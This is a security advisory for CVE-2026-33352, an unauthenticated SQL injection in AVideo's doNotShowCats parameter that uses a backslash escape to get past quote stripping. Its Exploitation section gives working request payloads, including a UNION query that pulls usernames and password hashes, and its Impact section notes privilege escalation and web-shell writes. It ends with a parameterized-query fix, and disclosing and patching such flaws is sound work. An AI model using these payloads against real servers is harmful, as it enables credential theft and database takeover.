# [C] AVideo has an Unauthenticated SQL Injection via `doNotShowCats` Parameter (Backslash Escape Bypass)

## Summary
Severity: Critical
Advisory: GHSA-mcj5-6qr4-95fj
CVE: CVE-2026-33352
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-mcj5-6qr4-95fj
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
### Summary

An unauthenticated SQL injection vulnerability exists in `objects/category.php` in the `getAllCategories()` method. The `doNotShowCats` request parameter is sanitized only by stripping single-quote characters (`str_replace("'", '', ...)`), but this is trivially bypassed using a backslash escape technique to shift SQL string boundaries. The parameter is not covered by any of the application's global input filters in `objects/security.php`.

### Affected Component

**File:** `objects/category.php`, lines 386-394, inside method `getAllCategories()`

```php
if (!empty($_REQUEST['doNotShowCats'])) {
    $doNotShowCats = $_REQUEST['doNotShowCats'];
    if (!is_array($_REQUEST['doNotShowCats'])) {
        $doNotShowCats = array($_REQUEST['doNotShowCats']);
    }
    foreach ($doNotShowCats as $key => $value) {
        $doNotShowCats[$key] = str_replace("'", '', $value);  // INSUFFICIENT
    }
    $sql .= " AND (c.clean_name NOT IN ('" . implode("', '", $doNotShowCats) . "') )";
}
```

### Root Cause

1. **Incomplete sanitization:** The only defense is `str_replace("'", '', $value)`, which strips single-quote characters. It does **not** strip backslashes (`\`).
2. **No global filter coverage:** The `doNotShowCats` parameter is absent from every filter list in `objects/security.php` (`$securityFilter`, `$securityFilterInt`, `$securityRemoveSingleQuotes`, `$securityRemoveNonChars`, `$securityRemoveNonCharsStrict`, `$filterURL`, and the `_id` suffix pattern).
3. **Direct string concatenation into SQL:** The filtered values are concatenated into the SQL query via `implode()` instead of using parameterized queries.

### Exploitation

MySQL, by default, treats the backslash (`\`) as an escape character inside string literals (unless `NO_BACKSLASH_ESCAPES` SQL mode is enabled, which is uncommon). This allows a backslash in one array element to escape the closing single-quote that `implode()` adds, shifting the string boundary and turning the next array element into executable SQL.

**Step-by-step:**

1. The attacker sends:
   ```
   GET /categories.json.php?doNotShowCats[0]=\&doNotShowCats[1]=)%20OR%201=1)--%20-
   ```

2. After `str_replace("'", '', ...)`, values are unchanged (no single quotes to strip):
   - Element 0: `\`
   - Element 1: `) OR 1=1)-- -`

3. After `implode("', '", ...)`, the concatenated string is:
   ```
   \', ') OR 1=1)-- -
   ```

4. The full SQL becomes:
   ```sql
   AND (c.clean_name NOT IN ('\', ') OR 1=1)-- -') )
   ```

5. MySQL parses this as:
   - `'\'` — the `\` escapes the next `'`, making it a literal quote character inside the string. The string continues.
   - `, '` — the comma and space are part of the string. The next `'` (which was the opening quote of element 1) **closes** the string.
   - String value = `', ` (three characters: quote, comma, space)
   - `) OR 1=1)` — executable SQL. The first `)` closes `NOT IN (`, the second `)` closes the outer `AND (`.
   - `-- -` — SQL comment, discards the remainder `') )`

   Effective SQL:
   ```sql
   AND (c.clean_name NOT IN (', ') OR 1=1)
   ```
   This always evaluates to `TRUE`.

**For data extraction (UNION-based):**

```
GET /categories.json.php?doNotShowCats[0]=\&doNotShowCats[1]=))%20UNION%20SELECT%201,user,password,4,5,6,7,8,9,10,11,12,13,14%20FROM%20users--%20-
```

Produces:
```sql
AND (c.clean_name NOT IN ('\', ')) UNION SELECT 1,user,password,4,5,6,7,8,9,10,11,12,13,14 FROM users-- -') )
```

This appends a UNION query that extracts usernames and password hashes from the `users` table. The attacker must match the column count of the original `SELECT` (determinable through iterative probing).

### Impact

- **Confidentiality:** Full read access to the entire database, including user credentials, emails, private video metadata, API secrets, and plugin configuration.
- **Integrity:** Ability to modify or delete any data in the database via stacked queries or subqueries (e.g., `UPDATE users SET isAdmin=1`).
- **Availability:** Ability to drop tables or corrupt data.
- **Potential RCE:** On MySQL configurations that allow `SELECT ... INTO OUTFILE`, the attacker could write a PHP web shell to the server's document root.

### Suggested Fix

Replace the string concatenation with parameterized queries:

```php
if (!empty($_REQUEST['doNotShowCats'])) {
    $doNotShowCats = $_REQUEST['doNotShowCats'];
    if (!is_array($doNotShowCats)) {
        $doNotShowCats = array($doNotShowCats);
    }
    $placeholders = array_fill(0, count($doNotShowCats), '?');
    $formats = str_repeat('s', count($doNotShowCats));
    $sql .= " AND (c.clean_name NOT IN (" . implode(',', $placeholders) . ") )";
    // Pass $formats and $doNotShowCats to sqlDAL::readSql() as bind parameters
}
```

Alternatively, use `$global['mysqli']->real_escape_string()` on each value as a minimum fix, though parameterized queries are strongly preferred.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-mcj5-6qr4-95fj
- https://nvd.nist.gov/vuln/detail/CVE-2026-33352
- https://github.com/WWBN/AVideo/commit/206d38e97b8c854771bb2907b13f9f36e8bcf874
- https://github.com/WWBN/AVideo
